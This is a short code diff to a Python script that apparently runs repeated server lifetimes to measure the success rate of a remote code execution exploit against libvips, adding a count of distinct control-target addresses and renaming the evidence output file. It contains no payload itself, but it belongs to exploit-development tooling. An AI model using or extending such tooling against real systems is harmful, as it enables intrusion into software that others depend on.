@@ -142,7 +142,7 @@ def main() -> int:
     parser.add_argument("--leak-attempts", type=int, default=64)
     parser.add_argument(
         "--output", type=Path,
-        default=HERE / "evidence/heap-calibrated-rce-10x.json",
+        default=HERE / "evidence/libvips-control-target-rce-10x.json",
     )
     args = parser.parse_args()
     if args.lifetimes < 1:
@@ -151,7 +151,7 @@ def main() -> int:
         parser.error("--leak-attempts must be positive")
 
     results: list[dict[str, object]] = []
-    with tempfile.TemporaryDirectory(prefix="kan2158-cohort-") as directory:
+    with tempfile.TemporaryDirectory(prefix="kan2159-cohort-") as directory:
         temporary = Path(directory)
         for lifetime in range(1, args.lifetimes + 1):
             print(f"[cohort {lifetime}/{args.lifetimes}] starting fresh server")
@@ -183,6 +183,11 @@ def main() -> int:
             result.get("libvips_base") for result in results
             if result.get("libvips_base")
         }),
+        "distinct_control_target_addresses": len({
+            result.get("control_target", {}).get("address")
+            for result in results
+            if result.get("control_target", {}).get("address")
+        }),
         "results": results,
     }
     args.output.parent.mkdir(parents=True, exist_ok=True)
@@ -190,6 +195,7 @@ def main() -> int:
     print(json.dumps({key: report[key] for key in (
             "profile_id", "lifetimes", "successes", "success_rate",
             "unique_profile_selections", "distinct_libvips_bases",
+            "distinct_control_target_addresses",
     )}, indent=2))
     return 0 if successes == args.lifetimes else 1
 
